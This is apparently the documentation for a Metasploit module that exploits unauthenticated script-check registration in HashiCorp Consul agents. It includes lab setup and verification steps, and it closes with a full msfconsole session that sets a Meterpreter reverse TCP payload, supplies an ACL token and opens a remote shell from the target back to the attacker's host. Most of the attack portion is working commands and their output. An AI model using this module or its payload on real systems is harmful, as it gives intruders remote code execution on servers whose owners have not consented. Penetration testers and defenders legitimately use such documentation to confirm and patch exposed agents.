Hashicorp Consul Agent is serving a REST API which can be used to execute scripts on a regular basis.
By default, this endpoint is not protected and anyone can add his own command line.

## Vulnerable application

Grab the Consul prebuilt binary [here](https://www.consul.io/downloads.html) and run the binary in dev mode with check scripts enabled:
```
$ ./consul agent -dev -enable-script-checks
```

This is sufficient to test the module.

## Verification Steps


Confirm that check functionality works:
- [ ] Start Consul Agent without the check scripts enabled: `./consul agent -dev`
- [ ] Start `msfconsole`
- [ ] `use exploit/multi/misc/consul_agent`
- [ ] Set the `RHOST`.
- [ ] Confirm the target is *not* vulnerable: `check`
- [ ] Observe that the target is *not* vulnerable: `The target is not exploitable`
- [ ] Restart Consul Agent with the check scripts enabled: `./consul agent -dev -enable-script-checks`
- [ ] Confirm the target is vulnerable: `check`
- [ ] Confirm that the target is vulnerable: `The target is vulnerable.`

Confirm that command execution functionality works:
- [ ] Set a payload: `set payload linux/x86/meterpreter/reverse_tcp`
- [ ] Set `LHOST` and `LPORT`
- [ ] Run the exploit: `run`
- [ ] Confirm you have now a meterpreter session

## Options

**PATH**

The path to the Consult REST API. By default, the path is `/`.

**ACL_TOKEN**

If the API is protected by a token and you have this token, you can set its value to make the REST API calls work.


## Scenarios

### Meterpreter reverse tcp

In this example, the Consul instance is protected by an *ACL token*:
```
msf5 > use exploit/multi/misc/consul_agent 
msf5 exploit(multi/misc/consul_agent) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf5 exploit(multi/misc/consul_agent) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf5 exploit(multi/misc/consul_agent) > set LPORT 12345
LPORT => 12345
msf5 exploit(multi/misc/consul_agent) > set ACL_TOKEN FBAF54CC-E03D-4763-9F19-376114D3857B
ACL_TOKEN => FBAF54CC-E03D-4763-9F19-376114D3857B
msf5 exploit(multi/misc/consul_agent) > check 
[+] 192.168.56.101:8500 The target is vulnerable.
msf5 exploit(multi/misc/consul_agent) > run

[*] Started reverse TCP handler on 192.168.56.1:12345 
[+] The shell is on the way!
[*] Command Stager progress - 100.00% done (763/763 bytes)
[*] Sending stage (861480 bytes) to 192.168.56.101

meterpreter > sysinfo 
Computer     : 192.168.56.101
OS           : Debian 9.4 (Linux 4.9.0-6-amd64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```
